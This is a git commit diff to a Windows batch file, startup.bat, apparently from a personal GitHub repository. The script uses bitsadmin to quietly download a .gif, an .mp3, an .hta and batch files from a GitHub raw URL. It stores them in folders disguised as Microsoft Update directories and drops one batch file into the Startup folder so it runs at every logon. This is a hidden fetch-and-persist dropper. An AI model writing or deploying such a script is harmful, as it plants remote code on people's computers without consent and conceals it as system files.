44dd857246a136dbf8ff8993b5ec3d843868cef9
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-11 23:51:12 +0800

    Update startup.bat

--- Online/startup.bat
+++ Online/startup.bat
@@ -6,7 +6,7 @@ mkdir "%AppData%\Microsoft\Update\User\Services"
 
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/msrklbg.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrklbg.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrkl.hta" "%AppData%\Microsoft\Update\msrkl.hta"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrkl.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
 
